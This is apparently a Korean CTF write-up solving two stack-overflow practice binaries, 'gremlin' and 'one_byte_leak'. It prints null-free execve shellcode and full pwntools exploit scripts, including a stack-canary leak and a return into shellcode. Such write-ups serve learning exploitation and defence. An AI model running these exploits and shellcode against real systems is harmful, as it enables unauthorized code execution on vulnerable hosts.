# LOB (aslr off)

## gremlin

![Pwnable1](/assets/img/posts/pwnable/2026-05-26-pwnable-1.png)

gremlin은 32비트 아키텍쳐이고,

![Pwnable1](/assets/img/posts/pwnable/2026-05-26-pwnable-2.png)

보호기법은 다음과 같다.

```assembly
#include <stdio.h>

int main()
{
    char buffer[256];

    scanf("%s", buffer);
    printf("%s\n", buffer);

    return 0;
}
```

256byte의 buffer를 만들고, scanf로 값을 입력받고 이를 출력한다.

어셈블리 코드를 gdb로 분석해보자


buffer의 위치가 `$ebp -0x100` 임을 확인할 수 있다.

main함수의 stack frame을 생각해 볼때

buffer : `$ebp-0x100`

sfp (4bytes)

ret : (4bytes)

순으로 입력되어 있는 것을 확인할 수 있다.

```markdown
\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80
```

널바이트가 없는 26bytes 쉘코드를 준비했다. scanf에서는 널바이트를 문자열의 끝으로 인식하기 때문에, 입력을 주더라도 전부 입력되지 않기 때문에 꼭 널바이트 없는 쉘코드를 사용해야 한다.

payload = 쉘코드(26bytes) + dummy(256-26) + sfp(4bytes) + buf_addr(4bytes)

buf_addr를 구해보자

![Pwnable1](/assets/img/posts/pwnable/2026-05-26-pwnable-3.png)

![Pwnable1](/assets/img/posts/pwnable/2026-05-26-pwnable-4.png)

pause()후 attach로 임시로 짠 payload를 전달하고, $ebp-0x100의 주소값 확인

buf_addr =` 0xffffcef8`

최종 코드

```python
from pwn import *

p = process('./gremlin')

pause()
shellcode = b'\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80'

buf_addr = 0xffffcef8

payload = b""
payload += shellcode
payload = payload.ljust(256, b'A')
payload += b'B' * 4
payload += p32(buf_addr)

p.sendline(payload)

p.interactive()
```

payload = dummy(0x10) + sfp(0x4) + ret(0x4) + shellcode(26)

## one_byte_leak

![Pwnable1](/assets/img/posts/pwnable/2026-05-26-pwnable-18.png)

![Pwnable1](/assets/img/posts/pwnable/2026-05-26-pwnable-19.png)

보호기법

카나리가 활성화되어있다.

```c
// -z execstack -no-pie -Wl,-z,norelro -U_FORTIFY_SOURCE

#include <stdio.h>

void init() {
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
}

int main() {
    init();

    char buf[0x30] = {0, };

    printf("buf's address: %p\n", buf);

    read(0, buf, 0x100);

    for(int i = 0;; i++) {
        if (buf[i] == 0) {
            break;
        }
        printf("%02x", (unsigned char)buf[i]);
    }
    printf("\n");

    read(0, buf, 0x100);

    return 0;
}
```

C언어

` printf("buf's address: %p\n", buf);`

로 버퍼의 주소를 출력해주므로, aslr이 활성화되어 주소가 랜덤화되어도 새로운 주소를 알아낼 수 있다.

```c
read(0, buf, 0x100);

    for(int i = 0;; i++) {
        if (buf[i] == 0) {
            break;
        }
        printf("%02x", (unsigned char)buf[i]);
    }
    printf("\n");

    read(0, buf, 0x100);
```

buf의 사이즈는 0x30인데, 0x100만큼 입력을 받을 수 있으므로 오버플로우가 발생한다.

카나리가 활성화되어있어서 단순히 RET을 덮으면 안되는데, 위 코드를 보면 카나리를 유출할 수 있게 되어있다.

널바이트를 만나면 반복문을 종료하기 때문에, 카나리의 첫바이트를 오버라이트해서 카나리를 유출할 수 있다.

이후 다시 read하는 부분에서 카나리를 보존하고, ret 주소를 덮을 수 있다.

카나리 주소는 $rbp-0x8

0x40 - 0x8 = 0x38

→  카나리 유출

payload2 = shellcode(23) + dummy(0x38 - 23) + canary(8bytes) + sfp(8) + buf_addr(8byte)

![Pwnable1](/assets/img/posts/pwnable/2026-05-26-pwnable-20.png)

1. read함수는 개행 문자(0a)도 그대로 읽어서 출력하기 때문에, 0x39가 아니라 0x38개의 입력을 줘야 한다.
1. `printf("%02x", (unsigned char)buf[i]);`

%02x 는 16진수 2자리로 출력하라는 뜻이기 때문에, 카나리를 출력하려면 p.recv(14)를 해야한다. 이를 바이트로 decode한뒤, u64로 언패킹 하면 된다.

위의 두 문제 때문에 푸는데 오래걸렸다…

```assembly
from pwn import *

p = process('./one_byte_leak')


shellcode = b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'

p.recvuntil(b'address: ')
buf_addr = p64(int(p.recvline()[:-1], 16))

p.sendline(b'A' * 0x38)

p.recvuntil(b'0a')

canary = b"\x00" + bytes.fromhex(p.recvn(14).decode())
canary = u64(canary)

p.recvline()

payload = shellcode
payload += b'A' * (0x38 - len(shellcode))
payload += p64(canary)
payload += b'B' * 8
payload += buf_addr


p.sendline(payload)
```
